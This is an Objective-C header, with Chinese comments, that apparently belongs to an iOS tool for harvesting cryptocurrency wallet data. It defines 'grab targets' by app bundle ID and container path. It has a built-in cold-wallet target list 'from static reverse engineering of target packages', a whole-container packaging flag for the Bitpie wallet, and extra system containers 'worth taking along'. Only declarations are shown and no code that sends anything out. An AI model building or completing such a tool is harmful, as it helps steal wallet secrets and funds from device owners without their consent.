#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// 一个钱包/App 的抓取目标定义
@interface WQLTarget : NSObject

@property (nonatomic, copy) NSString *name;
@property (nonatomic, copy) NSArray<NSString *> *bundleIDs;    // 精确匹配
@property (nonatomic, copy) NSArray<NSString *> *fuzzyIDs;     // 小写子串匹配
@property (nonatomic, copy) NSArray<NSString *> *relativePaths; // 容器内相对路径（文件或目录）
@property (nonatomic, assign) BOOL wholeContainer;             // 整个容器打包（Bitpie）

- (BOOL)matchesBundleID:(NSString *)bundleID;

@end

/// 内置冷钱包目标表（来自对目标包的静态逆向结论）
@interface WQLTargets : NSObject

+ (NSArray<WQLTarget *> *)wallets;

/// 不在目录内时也值得一并带走的系统/共享容器
+ (NSArray<WQLTarget *> *)extras;

+ (nullable WQLTarget *)matchBundleID:(NSString *)bundleID
                            inTargets:(NSArray<WQLTarget *> *)targets;

@end

NS_ASSUME_NONNULL_END